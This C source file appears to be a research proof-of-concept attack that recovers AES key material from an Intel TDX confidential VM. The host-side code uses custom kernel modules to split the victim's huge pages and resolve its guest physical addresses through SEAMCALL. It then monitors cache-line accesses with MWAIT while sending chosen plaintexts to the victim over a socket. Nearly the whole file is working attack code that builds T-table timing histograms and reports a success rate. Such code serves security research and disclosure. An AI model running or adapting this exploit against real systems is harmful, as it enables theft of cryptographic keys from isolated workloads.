#include <fcntl.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <time.h>
#include <poll.h>
#include <stddef.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include "tdxutils.h"

#ifndef countof
#define countof(x) (sizeof(x)/sizeof(*(x)))
#endif

#define NUM_ATTACK_RUNS 3

#define PORT 12123
#define NUMBER_OF_ENCRYPTIONS_VISUAL 1

#define CRED "\033[91m"
#define CRESET "\033[39m"

const char loading[] = "|/-\\";
static struct tdx_mwait_access mwait_accesses[0x200];
static size_t timings[16][16] = {0,};
static int victim_sockfd = -1;
static int util_fd = -1, mwait_fd = -1;
static unsigned long term_gpa, encrypt_gpa, probe_gpa, tdr_pa;

static unsigned long rdtsc(void) {
    unsigned long hi, lo;
    asm volatile("rdtsc" : "=d"(hi), "=a"(lo));
    return (hi << 32) | lo;
}

static unsigned char get_page_level(int util_fd, unsigned long gpa) {
    union tdx_sept_entry entry = {};
    unsigned long rc;

    // Align to 2MB boundary for checking
    gpa = level_align(gpa, TDX_LEVEL_2M);

    rc = seamcall_tdh_mem_sept_rd(util_fd, TDX_LEVEL_2M, gpa, tdr_pa, (unsigned long *)&entry, NULL);
    if (rc != TDX_SUCCESS) {
        fprintf(stderr, "Error - Could not resolve GPA 0x%lx (rc 0x%lx)! Make sure it is valid.\n", gpa, rc);
        return 0; // Return 0 (4KB) as default
    }

    return entry.leaf ? 1 : 0; // 1 = 2MB page, 0 = 4KB page
}

static int split_huge_pages(int util_fd, unsigned long start_gpa, unsigned long end_gpa) {
    struct tdx_split_huge_pages_req req = {
        .tdr_pa = tdr_pa,
        .start_gpa = start_gpa,
        .end_gpa = end_gpa,
        .target_level = 0 // PG_LEVEL_4K
    };

    if (ioctl(util_fd, IOCTL_TDX_SPLIT_HUGE_PAGES, &req) < 0) {
        perror("ioctl IOCTL_TDX_SPLIT_HUGE_PAGES");
        return -1;
    }

    return 0;
}

static void split_gpa_if_2mb(int util_fd, unsigned long gpa) {
    unsigned char level = get_page_level(util_fd, gpa);

    if (level == TDX_LEVEL_4K)
        return;

    split_huge_pages(util_fd, level_align(gpa, TDX_LEVEL_2M), level_align(gpa, TDX_LEVEL_2M) + level_pg_size(TDX_LEVEL_2M));
}

static unsigned long gpa_to_hpa(int util_fd, unsigned long gpa) {
    unsigned long rc, level = 0;
    union tdx_sept_entry entry;

    // First try to resolve as a 2MB page
    rc = seamcall_tdh_mem_sept_rd(util_fd, 1, gpa & ~((1ul << 21) - 1), tdr_pa, (void*) &entry, &level);
    if (rc != TDX_SUCCESS)
        return ~0ul;

    // This is indeed a 2MB page - return result
    if (entry.leaf)
        return (entry.pfn << 12) | (gpa & ((1ul << 21) - 1));

    // Resolve as a 4kB page instead
    rc = seamcall_tdh_mem_sept_rd(util_fd, 0, gpa, tdr_pa, (void*) &entry, NULL);
    if (rc != TDX_SUCCESS)
        return ~0ul;

    return (entry.pfn << 12) | (gpa & 0xfff);
}

void empty_read_queue(void) {
    ssize_t status;
    unsigned long dump[64];

    ioctl(mwait_fd, IOCTL_MWAIT_GET_ACCESS_COUNTS, dump);
}

void get_access_times(unsigned long* times_per_cl) {
    ssize_t status;
    unsigned int i, j;
    unsigned long access_counts[64];

    status = ioctl(mwait_fd, IOCTL_MWAIT_GET_ACCESS_COUNTS, access_counts);
    if (status < 0) {
        perror("IOCTL_MWAIT_GET_ACCESS_COUNTS");
        exit(EXIT_FAILURE);
    }

    for (i = (probe_gpa >> 6) & 0x3f, j = 0; j < 16; i = (i + 1) & 0x3f, j++)
        times_per_cl[j] += access_counts[i];
}

static unsigned long get_access_times_sum(unsigned char byte, unsigned long* times_per_cl) {
    static unsigned int p = 0;
    unsigned int i;

    printf("\r[%c]", loading[p++ % strlen(loading)]);
    fflush(stdout);

    for (i = 0; i < NUMBER_OF_ENCRYPTIONS_VISUAL; ++i) {
        empty_read_queue();
        send(victim_sockfd, &byte, 1, MSG_DONTWAIT);
        recv(victim_sockfd, &byte, 1, 0);
        get_access_times(times_per_cl);
    }
}

static void probe_byte_aes(unsigned char byte) {
    unsigned long times_per_cl[16] = {0, };
    int addr;

    get_access_times_sum(byte, times_per_cl);

    for (addr = 0; addr < 16; addr++)
        timings[addr][byte / 16] += times_per_cl[addr];
}

static void output_results(size_t start_time, size_t start_time_wall, size_t* elapsed_out, unsigned char* success_out) {
    struct timespec t1 = {0,};
    size_t row_max, row_min, total_time, time_wall;
    FILE *f = fopen("hist.csv", "w");
    unsigned int correct_max = 0, correct_min = 0;
    unsigned int x, y;

    for (y = 0; y < 16; y++) {
        row_max = 0;
        row_min = -1ull;

        for (x = 0; x < 16; x++) {
            if (timings[y][x] < row_min)
                row_min = timings[y][x];
            if (timings[y][x] > row_max)
                row_max = timings[y][x];
        }

        for (x = 0; x < 16; x++) {
            printf("\x1b[4%dm%6zu  \x1b[0m", timings[y][x] == row_max ? 1 : timings[y][x] == row_min ? 2 : 0, timings[y][x]);
            fprintf(f, "%zd%s", timings[y][x], x != 15 ? "," : "");

            if (x != y)
                continue;

            if (timings[y][x] == row_max)
                correct_max++;
            if (timings[y][x] == row_min)
                correct_min++;
        }

        fprintf(f, "\n");
        printf("\n");
    }

    total_time = rdtsc() - start_time;
    clock_gettime(CLOCK_MONOTONIC, &t1);
    time_wall = (t1.tv_sec * 1000 * 1000 * 1000ULL + t1.tv_nsec) - start_time_wall;

    fclose(f);

    *success_out = (correct_max == 16 || correct_min == 16) ? 1 : 0;
    *elapsed_out = time_wall / 1000000;

    if (correct_max == 16 || correct_min == 16)
        printf("\n\x1b[32mCORRECT!\x1b[0m\n");
    else
        printf("\n\x1b[31mFAILURE!\x1b[0m\n");

    printf("Time: %zd ms (%zd cycles)\n", time_wall / 1000000, total_time);
}

static void simple_first_round_attack(unsigned char* success_out, size_t* elapsed_out) {
    unsigned int i;
    unsigned char test_byte = 1;
    struct timespec t1;
    unsigned long probe_hpa;
    unsigned long start_time, start_time_wall;
    ssize_t status;
    struct tdx_mwait_access access = {0, };
    struct pollfd pfd = {.fd = mwait_fd, .events = POLLIN};
    static unsigned char target_buf [offsetof(struct tdx_mwait_multi_target, targets) + sizeof(struct tdx_mwait_target) * 16] = {0, };
    struct tdx_mwait_multi_target* targets = (void*) target_buf;

    memset(target_buf, 0, sizeof(target_buf));

    split_gpa_if_2mb(util_fd, probe_gpa);
    probe_hpa = gpa_to_hpa(util_fd, probe_gpa) & ~0x3ful;

    targets->num_targets = 16;
    targets->use_redundancy_core = 0;
    targets->count_only = 1;

    // Init targets
    for (i = 0; i < 16; i++) {
        targets->targets[i] = (struct tdx_mwait_target) {
            .access_type = TDX_ACCESS_TYPE_LOAD,
            .pmc = {{.raw = 0}, 0},
            .core = (unsigned char) i + 2,
            .redundancy_core = (unsigned char) i + 18,
            .hpa = probe_hpa + i * 0x40,
        };
    }

    // Make sure that victim is active and can respond
    if (send(victim_sockfd, &test_byte, 1, 0) != 1) {
        perror("send");
        exit(EXIT_FAILURE);
    }
    if (recv(victim_sockfd, &test_byte, 1, 0) != 1) {
        perror("recv");
        exit(EXIT_FAILURE);
    }

    srand(0);

    // Setup monitor
    status = ioctl(mwait_fd, IOCTL_MWAIT_MONITOR_MULTI, (void*) targets);
    if (status < 0) {
        perror("IOCTL_MWAIT_MONITOR_MULTI");
        fflush(stderr);
        exit(EXIT_FAILURE);
    }

    start_time = rdtsc();

    clock_gettime(CLOCK_MONOTONIC, &t1);
    start_time_wall = t1.tv_sec * 1000 * 1000 * 1000ULL + t1.tv_nsec;

    for (size_t byte = 0; byte < 256; byte += 16)
        probe_byte_aes((unsigned char) byte);

    status = ioctl(mwait_fd, IOCTL_MWAIT_STOP_MONITOR);
    if (status < 0) {
        perror("IOCTL_MWAIT_STOP_MONITOR");
        fflush(stderr);
        exit(EXIT_FAILURE);
    }

    printf("\r");
    output_results(start_time, start_time_wall, elapsed_out, success_out);

    empty_read_queue();
}

static int connect_to_victim(const char* ip_addr) {
    struct sockaddr_in server_addr = {0, };
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT);

    if (inet_pton(AF_INET, ip_addr, &server_addr.sin_addr) <= 0) {
        perror("inet_pton");
        printf("Could not parse IP address\n");
        exit(EXIT_FAILURE);
    }

    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("connect");
        exit(EXIT_FAILURE);
    }

    printf("Connected to %s:%d\n", ip_addr, PORT);

    return sockfd;
}

static size_t mean(const size_t* buf, size_t len) {
    size_t ret = 0, i = len;
    while (i--)
        ret += buf[i];
    return ret / len;
}

static void dump_results(size_t elapsed, unsigned int success_rate) {
    unsigned int x, y;
    FILE* f;
    char fpath[256];

    snprintf(fpath, sizeof(fpath), "t_table_results_%lums_%.5f_success.txt", elapsed, (double) success_rate / (double) NUM_ATTACK_RUNS);

    f = fopen(fpath, "w");

    if (!f) {
        perror("fopen");
        exit(EXIT_FAILURE);
    }

    for (x = 0; x < 16; x++) {
        for (y = 0; y < 16; y++)
            fprintf(f, "%u %u %lu\n", y, x, timings[x][y]);
        fprintf(f, "\n");
    }

    fclose(f);
}

int main(int argc, char* argv[]) {
    const char* target_ip;
    char* endptr = NULL;
    FILE* f;
    size_t timings_accumulated[16][16] = {0,};
    size_t runtimes[NUM_ATTACK_RUNS] = {0, };
    unsigned int success_rate = 0, i, x, y;
    unsigned char success;

    memset(timings, 0, sizeof(timings));

    if (argc < 5) {
        printf("Usage: %s <target ip> <probe GPA> <termination GPA> <encrypt GPA>\nRun the victim inside a TD to get the info required to run this.\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    // Get parameters
    target_ip = argv[1];
    probe_gpa = strtoul(argv[2], &endptr, 0);
    if (*endptr != '\0') {
        fprintf(stderr, "Invalid probe GPA\n");
        exit(EXIT_FAILURE);
    }
    term_gpa = strtoul(argv[3], &endptr, 0);
    if (*endptr != '\0') {
        fprintf(stderr, "Invalid termination GPA\n");
        exit(EXIT_FAILURE);
    }
    encrypt_gpa = strtoul(argv[4], &endptr, 0);
    if (*endptr != '\0') {
        fprintf(stderr, "Invalid encrypt GPA\n");
        exit(EXIT_FAILURE);
    }

    util_fd = open("/dev/" TDXUTILS_DEVICE_NAME, O_RDWR);
    if (util_fd < 0) {
        perror("open /dev/" TDXUTILS_DEVICE_NAME);
        fprintf(stderr, "Make sure that the tdxutils kernel module is loaded\n");
        exit(EXIT_FAILURE);
    }
    mwait_fd = open("/dev/" TDX_MWAIT_DEVICE_NAME, O_RDWR);
    if (mwait_fd < 0) {
        fprintf(stderr, "Could not open the /dev/" TDX_MWAIT_DEVICE_NAME " device file. Make sure that the kernel module is loaded and mwait is supported by your CPU\n");
        exit(EXIT_FAILURE);
    }

    tdr_pa = get_tdr_pa(util_fd);

    // Open connection to victim for chosen plaintext attack
    victim_sockfd = connect_to_victim(target_ip);

    // Begin the attack
    for (i = 0; i < NUM_ATTACK_RUNS; i++) {
        success = 0;
        memset(timings, 0, sizeof(timings));
        simple_first_round_attack(&success, &runtimes[i]);
        success_rate += success ? 1 : 0;

        for (x = 0; x < 16; x++)
            for (y = 0; y < 16; y++)
                timings_accumulated[x][y] += timings[x][y];
    }

    memcpy(timings, timings_accumulated, sizeof(timings));

    dump_results(mean(runtimes, NUM_ATTACK_RUNS), success_rate);
    printf("SUCCESS RATE: %.5f (%u/%u)\n", (double) success_rate / (double) NUM_ATTACK_RUNS, success_rate, NUM_ATTACK_RUNS);
    f = fopen("runtimes.bin", "w");
    if (!f) {
        perror("fopen runtimes");
        exit(EXIT_FAILURE);
    }

    fwrite(runtimes, sizeof(*runtimes), NUM_ATTACK_RUNS, f);
    fclose(f);

    fflush(stdout);
    close(mwait_fd);
    close(util_fd);
    return 0;
}
